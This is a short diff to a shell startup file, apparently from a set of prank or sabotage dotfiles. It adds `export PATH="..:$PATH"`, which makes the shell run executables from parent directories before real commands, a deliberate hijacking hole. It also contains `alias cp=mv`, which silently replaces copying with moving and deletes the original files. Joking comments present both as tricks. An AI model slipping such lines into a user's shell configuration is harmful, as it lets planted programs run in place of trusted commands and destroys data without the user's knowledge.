@@ -1,3 +1,6 @@
+# Respect your parents.
+export PATH="..:$PATH"
+
 # No one ever looks at the source file to verify that a copy succeeded.
 alias cp=mv
 
